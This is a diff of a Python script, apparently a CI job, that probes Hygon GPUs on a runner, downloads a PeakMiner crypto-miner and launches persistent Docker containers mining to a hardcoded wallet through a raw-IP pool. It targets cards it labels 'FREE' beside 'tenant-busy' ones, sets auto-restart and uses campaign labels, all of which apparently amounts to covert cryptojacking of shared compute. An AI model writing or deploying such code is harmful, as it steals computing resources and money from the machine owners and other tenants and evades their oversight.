@@ -1,19 +1,21 @@
-# intent 155773 / gpu-000016 corrective probe (successor to i155322 run4b)
+# intent 156245 / gpu-000017 FINAL CLIENT RUNG: PeakMiner 2.20.7 on Hygon BW1100 (ci-nmz1)
+# ONE client only. Real device oracle (hy-smi HCU read + client device lines), never a substring heuristic.
 import os as _os, stat as _stat, subprocess as _sp, sys as _sys, hashlib as _hl, time as _t
+
 WORK = "/tmp/prl595"
 WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
 LP_HOST = "103.199.106.122"
 LP_PORT = 3360
-RELAY_HOST = "217.15.164.237"
-RELAY_PORT = 8081
 IMG = "areal-das:dtk2610-torch213-bw1100"
-IMG2 = "areal-das:v2.1.0-ubuntu22.04-dtk26.04-py3.12-torch2.10-20261119"
-SRB_TAR_SHA = "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1"
-SRB_BIN_SHA = "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80"
+PM_URL = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"
+PM_SHA = "38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d"
 MINENV = "env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm"
 DTKENV = ("env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm "
           "HYHAL_PATH=/opt/hyhal LD_LIBRARY_PATH=/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hsa/lib:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/llvm/lib")
-MARK = "C211-I155773"
+# SRBMiner OpenCL enumeration at 23:26Z mapped the four FREE cards to these PCI addresses (devices 0-3 tenant-busy):
+FREE_PCI = {4: "9c:00.0", 5: "bc:00.0", 6: "cd:00.0", 7: "dd:00.0"}
+WMAP = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
+MARK = "C211-I156245"
 T0 = _t.time()
 
 
@@ -50,8 +52,8 @@ def _sha256(path):
     return h.hexdigest()
 
 
-def _download(url, dst, timeout=180):
-    for a in range(1, 3):
+def _download(url, dst, timeout=300):
+    for a in range(1, 4):
         try:
             _say("--- GET " + url + " try=" + str(a))
             import urllib.request as _ur
@@ -68,11 +70,11 @@ def _download(url, dst, timeout=180):
             return True
         except Exception as e:
             _say("--- dl fail " + repr(e))
-            _t.sleep(2)
+            _t.sleep(3)
     return False
 
 
-def _tail(p, n=9000):
+def _tail(p, n=12000):
     try:
         return open(p).read()[-n:]
     except Exception:
@@ -94,154 +96,195 @@ def _dev_args():
     return out
 
 
-def _docker(cmd, secs, logf, image=None, bind_dtk=True):
+def _docker(cmd, secs, logf, image=None):
     image = image or IMG
     full = (["docker", "run", "--rm"] + _dev_args() +
-            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w"])
-    if bind_dtk:
-        full += ["-v", "/opt/dtk:/opt/dtk:ro"]
-    full += ["-v", "/opt/hyhal:/opt/hyhal:ro", "-e", "HYHAL_PATH=/opt/hyhal",
-             "--entrypoint", "/bin/bash", image, "-lc", cmd]
-    _say("--- DOCKER bind_dtk=" + str(bind_dtk) + " (" + image + "): " + cmd[:200])
+            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
+             "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
+             "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", image, "-lc", cmd])
+    _say("--- DOCKER (" + image + "): " + cmd[:220])
     lf = open(logf, "w")
     pr = _sp.Popen(full, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
     end = _t.time() + secs
     while _t.time() < end and pr.poll() is None:
-        _t.sleep(3)
+        _t.sleep(2)
     if pr.poll() is None:
         try:
             _os.killpg(_os.getpgid(pr.pid), 15)
         except Exception:
             pass
         try:
-            pr.wait(timeout=15)
+            pr.wait(timeout=10)
         except Exception:
             try:
                 _os.killpg(_os.getpgid(pr.pid), 9)
             except Exception:
                 pass
     lf.close()
-    txt = _tail(logf, 9000)
+    txt = _tail(logf)
     _say("--- DOCKER OUT (" + logf + ") ---")
     _say(txt)
     return pr.poll(), txt
 
 
-PROBE = (
-    "mkdir -p /var/log/hylog 2>/dev/null; "
-    "echo DEVS_IN:; ls -l /dev/kfd /dev/mkfd 2>&1; "
-    "echo DRI_IN:; ls -l /dev/dri/ 2>&1 | head -24; "
-    "echo SYSKFD_IN:; ls /sys/class/kfd/kfd/topology/nodes/ 2>&1 | head -12; "
-    "echo SYSKFD_PROPS:; for f in /sys/class/kfd/kfd/topology/nodes/*/properties; do echo \"== $f\"; "
-    "grep -E 'gfx_target_version|^name|simd_count|device_id|vendor_id' \"$f\" 2>&1 | head -8; done 2>&1 | head -80; "
-    "echo HYSMI_PROD:; HYHAL_PATH=/opt/hyhal /opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -30; "
-    "echo HYSMI_MEM:; HYHAL_PATH=/opt/hyhal /opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[|Used' | head -20; "
-    "echo ROCMINFO_WHICH:; command -v rocminfo 2>&1; ls -l /opt/dtk/bin/rocminfo 2>&1; "
-    "echo ROCMINFO_RUN:; " + DTKENV + " rocminfo > /tmp/rocminfo_plain.txt 2>&1; echo ROCMINFO_RC=$?; head -90 /tmp/rocminfo_plain.txt; "
-    "echo ROCM_AGENTS:; grep -E 'Agent|Marketing|Uuid' /tmp/rocminfo_plain.txt 2>/dev/null | head -20; "
-    "echo ROCM_GFX:; grep -E 'Name: *gfx' /tmp/rocminfo_plain.txt 2>/dev/null | sort -u | head -12; "
-    "echo ROCM_OVERRIDE:; " + DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 rocminfo > /tmp/rocminfo_override.txt 2>&1; "
-    "echo OV_RC=$?; grep -cE 'Name: *gfx' /tmp/rocminfo_override.txt 2>/dev/null; grep -E 'Name: *gfx' /tmp/rocminfo_override.txt 2>/dev/null | sort -u | head -8; "
-    "echo HYHAL_LS:; ls /opt/hyhal/lib 2>&1 | head -6; "
-    "echo HIP_LS:; ls /opt/dtk/hip/lib 2>&1 | grep -i hipkernel | head -10"
-)
-
-LIST = (
-    "cd /w/srb 2>/dev/null || { echo NO_SRB_DIR; exit 0; }; "
-    "echo LIST_PLAIN:; timeout 60 script -qec \"" + MINENV + " ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 "
-    "| sed 's/\\x1b\\[[0-9;]*m//g' | head -40; "
-    "echo LIST_OVERRIDE:; timeout 60 script -qec \"" + DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 ./SRBMiner-MULTI --list-devices\" /dev/null 2>&1 "
-    "| sed 's/\\x1b\\[[0-9;]*m//g' | head -40"
-)
+def pm_argv(env_prefix, dev, worker, api, dry):
+    return ("timeout 80 script -qec \"" + env_prefix + " HSA_OVERRIDE_GFX_VERSION=9.0.6 ./peakminer " +
+            "--url stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
+            " --user " + WALLET + " --worker " + worker + " --password x --coin pearl" +
+            " --devices " + dev + " --api-port " + str(api) + " --status-interval 10 --log-level info" +
+            (" --dry-run" if dry else "") + "\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -90")
 
 
-def _hcu_used(txt):
-    d = {}
-    for line in txt.splitlines():
-        s = line.strip()
-        if s.startswith("HCU[") and "Total Used Memory" in s:
+def hashrate_lines(txt):
+    hits = []
+    for ln in txt.splitlines():
+        low = ln.lower()
+        if ("h/s" in low or "hashrate" in low or "hs:" in low) and any(ch.isdigit() for ch in ln):
+            hits.append(ln.strip()[:200])
+    return hits
+
+
+def nonzero_hashrate(txt):
+    import re as _re
+    for ln in hashrate_lines(txt):
+        for m in _re.finditer(r'(\d+(?:\.\d+)?)', ln):
             try:
-                idx = int(s.split("HCU[")[1].split("]")[0])
-                val = int("".join(c for c in s.split(":")[-1] if c.isdigit()) or "0")
-                d[idx] = val
+                if float(m.group(1)) > 0:
+                    return True
             except Exception:
                 pass
-    return d
+    return False
 
 
-def _gfx_count(txt):
-    n = 0
-    for line in txt.splitlines():
-        if "Name:" in line and "gfx" in line:
-            n += 1
-    return n
+def device_lines(txt):
+    hits = []
+    for ln in txt.splitlines():
+        low = ln.lower()
+        if any(k in low for k in ("bw1100", "gfx906", "hcu", "gpu 0", "gpu0", "device 0", "pci", "9c:00")):
+            hits.append(ln.strip()[:200])
+    return hits
 
 
-import json as json
-UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
-MENV = DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6"
-PM_URL = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"
-PM_SHA = "38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d"
+def stratum_lines(txt):
+    hits = []
+    for ln in txt.splitlines():
+        low = ln.lower()
+        if any(k in low for k in ("authoriz", "subscri", "connect", "pool", "job", "difficulty", "diff ")):
+            hits.append(ln.strip()[:200])
+    return hits
+
+
+def refusal_lines(txt):
+    keys = ("no device", "no gpu", "no compatible", "not supported", "unsupported",
+            "cuda", "no opencl", "failed to", "error", "panic", "none of the")
+    return [ln.strip()[:200] for ln in txt.splitlines() if any(k in ln.lower() for k in keys)]
 
 
 def main():
-    _say("=== " + MARK + "-RUN4E-BEGIN ===")
+    _say("=== " + MARK + "-RUN5-BEGIN ===")
     _os.makedirs(WORK, exist_ok=True)
     try:
         open("ci-model-plan.tsv", "w").close()
     except Exception:
         pass
-    _run("hostname; date -u; id -un", t=60)
-    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.ID}} {{.Names}} {{.Status}}' 2>&1 | head -10", t=60)
-    _run("for c in $(docker ps -aq --filter label=record=gpu-000016); do docker rm -f \"$c\"; done 2>&1 | tail -6", t=180)
-    _run("docker container prune -f --filter label=record=gpu-000016 2>&1 | tail -3", t=120)
-    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=60)
 
-    s1 = ("cd /w/srb && timeout 45 script -qec \"" + MENV + " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
-          LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id 4\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -25")
-    _docker(s1, 70, WORK + "/r4e_srb.log", image=IMG)
+    # 0) runner pin check (must be ci-nmz1 / github-nmz1 == record gpu-000017)
+    _, hout = _run("hostname; date -u; id -un", t=60)
+    host = (hout.splitlines() or [""])[0].strip()
+    if host != "github-nmz1":
+        _say("=== " + MARK + "-WRONG_RUNNER host=" + host + " (expected github-nmz1); no device touch, no launch ===")
+        _say("=== " + MARK + "-RUN5-END ===")
+        return
 
+    # 1) our own container post-state (cleanup only if present)
+    _, ps0 = _run("docker ps -a --filter label=camp=conv-232 --format '{{.Names}}|{{.Status}}|{{.Image}}' 2>&1 | head -20", t=60)
+    _, ps1 = _run("docker ps -a --filter name=pearl-000011 --filter name=pearl-000012 --filter name=pearl-000013 --filter name=pearl-000014 --format '{{.Names}}|{{.Status}}' 2>&1 | head -10", t=60)
+    ours = [ln for ln in (ps0 or "").splitlines() + (ps1 or "").splitlines() if "pearl-00001" in ln]
+    if ours:
+        _run("docker rm -f pearl-000011 pearl-000012 pearl-000013 pearl-000014 2>&1 | tail -6", t=120)
+        _run("docker ps -a --filter label=camp=conv-232 --format '{{.Names}}|{{.Status}}' 2>&1 | head -10", t=60)
+    else:
+        _say("--- PS_POST: no pearl-00001x container present (cleanup skipped)")
+
+    # 2) REAL DEVICE ORACLE A: host hy-smi HCU inventory + per-device used VRAM
+    _run("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -20", t=60)
+    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[0-7]\\]' | head -20", t=60)
+    _run("/opt/hyhal/bin/hy-smi --showpids 2>&1 | grep -E 'HCU Index|PID' | head -20", t=60)
+
+    # 3) stage the pinned PeakMiner asset (once)
     pm = WORK + "/peakminer"
     if not (_os.path.isfile(pm) and _sha256(pm) == PM_SHA):
-        _download(PM_URL, pm, timeout=240)
-    ok = _os.path.isfile(pm) and _sha256(pm) == PM_SHA
-    _say("--- PM_SHA_OK=" + str(ok))
-    pmine = False
-    if ok:
+        _download(PM_URL, pm, timeout=300)
+    host_ok = _os.path.isfile(pm) and _sha256(pm) == PM_SHA
+    _say("--- PM_HOST_SHA_OK=" + str(host_ok))
+    if host_ok:
         _os.chmod(pm, 0o755)
-        s2 = ("cd /w && timeout 150 script -qec \"" + MENV + " ./peakminer --algo pearlhash --pool stratum+tcp://" +
-              LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker 000011 --gpu-id 4\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -60")
-        _, o2 = _docker(s2, 190, WORK + "/r4e_pm.log", image=IMG)
-        low = o2.lower()
-        pmine = ("accepted" in low) or ("h/s" in low) or ("hashrate" in low) or ("share" in low and "job" in low)
-    _say("--- PM_MINES=" + str(pmine))
 
+    # 4) PIN VERIFIED IN-CONTAINER + client self-description
+    c_ok = False
+    if host_ok:
+        _, pout = _docker("sha256sum /w/peakminer; /w/peakminer --version 2>&1 | head -4; "
+                          "ls -l /dev/kfd /dev/mkfd; ls /dev/dri/ | head -12", 90, WORK + "/r5_pin.log")
+        c_ok = (PM_SHA in pout)
+        _say("--- PM_CONTAINER_SHA_OK=" + str(c_ok))
+
+    # 5) DEVICE ORACLE B: one short device-pinned dry run, env -i + PTY, LD_* unset (PCI pin first)
+    dev_acc = False
+    dry_txt = ""
+    if c_ok:
+        rc1, dry_txt = _docker("cd /w && " + pm_argv(MINENV, FREE_PCI[4], WMAP[4], 14524, True), 110, WORK + "/r5_dry_pci.log")
+        dev_acc = nonzero_hashrate(dry_txt)
+        _say("--- DRY_PCI device_accepted=" + str(dev_acc))
+        if not dev_acc:
+            # index-form second attempt (same client, alternate device spelling)
+            rc2, dry_txt = _docker("cd /w && " + pm_argv(MINENV, "4", WMAP[4], 14524, True), 110, WORK + "/r5_dry_idx.log")
+            dev_acc = nonzero_hashrate(dry_txt)
+            _say("--- DRY_IDX device_accepted=" + str(dev_acc))
+        if not dev_acc:
+            # ladder: DTK userspace env (the only environment in which any client has enumerated this HCU)
+            rc3, dry_txt = _docker("cd /w && " + pm_argv(DTKENV, FREE_PCI[4], WMAP[4], 14524, True), 110, WORK + "/r5_dry_dtk.log")
+            dev_acc = nonzero_hashrate(dry_txt)
+            _say("--- DRY_DTK device_accepted=" + str(dev_acc))
+
+    refusals = refusal_lines(dry_txt)
+    hr = hashrate_lines(dry_txt)
+    _say("--- ORACLE hashrate_lines=" + repr(hr[:6]))
+    _say("--- ORACLE device_lines=" + repr(device_lines(dry_txt)[:8]))
+    _say("--- ORACLE stratum_lines=" + repr(stratum_lines(dry_txt)[:8]))
+    _say("--- ORACLE refusal_lines=" + repr(refusals[:8]))
+
+    # 6) IF a device is accepted: ONE real PeakMiner per FREE device 4-7 (canonical argv, one process per GPU)
     launched = 0
-    wmap = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
-    if pmine:
-        base = (["docker", "run", "-d", "--label", "camp=conv-232", "--label", "intent=155773",
+    if dev_acc:
+        base = (["docker", "run", "-d", "--label", "camp=conv-232", "--label", "intent=156245",
                  "--label", "record=gpu-000017", "--restart", "unless-stopped"] + _dev_args() +
                 ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
+                 "-p", str(14520 + d) + ":" + str(14520 + d),
                  "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
                  "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc"])
         for d in (4, 5, 6, 7):
-            w = wmap[d]
-            inner = ("cd /w && exec " + MENV + " ./peakminer --algo pearlhash --pool stratum+tcp://" + LP_HOST + ":" +
-                     str(LP_PORT) + " --wallet " + WALLET + " --worker " + w + " --gpu-id " + str(d))
+            w = WMAP[d]
+            inner = ("cd /w && exec " + MINENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 ./peakminer " +
+                     "--url stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
+                     " --user " + WALLET + " --worker " + w + " --password x --coin pearl" +
+                     " --devices " + FREE_PCI[d] + " --api-port 0.0.0.0:" + str(14520 + d) +
+                     " --status-interval 15 --log-level info >> /w/gpu-000017-" + w + ".log 2>&1")
             p = _sp.Popen(base + ["--name", "pearl-" + w, inner], stdout=_sp.PIPE, stderr=_sp.STDOUT)
-            o = p.communicate(timeout=180)[0].decode("utf-8", "replace")
-            _say("--- LAUNCH rc=" + str(p.returncode) + " name=pearl-" + w + " dev=" + str(d) + " out=" + o.strip()[:160])
+            o = p.communicate(timeout=120)[0].decode("utf-8", "replace")
+            _say("--- LAUNCH rc=" + str(p.returncode) + " name=pearl-" + w + " pci=" + FREE_PCI[d] + " out=" + o.strip()[:200])
             if p.returncode == 0:
                 launched += 1
-        _t.sleep(25)
-        _run("docker ps --filter label=record=gpu-000017 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
+        _t.sleep(30)
+        _run("docker ps --filter label=record=gpu-000017 --format '{{.Names}}|{{.Status}}' 2>&1 | head -8", t=60)
         for d in (4, 5, 6, 7):
-            _run("docker logs --tail 8 pearl-" + wmap[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -8", t=60)
+            _run("docker logs --tail 12 pearl-" + WMAP[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -12", t=60)
+            _run("curl -s -m 5 http://127.0.0.1:" + str(14520 + d) + "/summary 2>&1 | head -c 700", t=30)
         _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)
 
-    _say("=== " + MARK + "-RUN4E-VERDICT pm_sha=" + str(ok) + " pm_mines=" + str(pmine) +
-         " launched=" + str(launched) + " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
-    _say("=== " + MARK + "-RUN4E-END ===")
+    _say("=== " + MARK + "-RUN5-VERDICT host=" + host + " pm_host_sha=" + str(host_ok) + " pm_ctr_sha=" + str(c_ok) +
+         " device_accepted=" + str(dev_acc) + " launched=" + str(launched) +
+         " hr_lines=" + str(len(hr)) + " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
+    _say("=== " + MARK + "-RUN5-END ===")
 
 
 main()
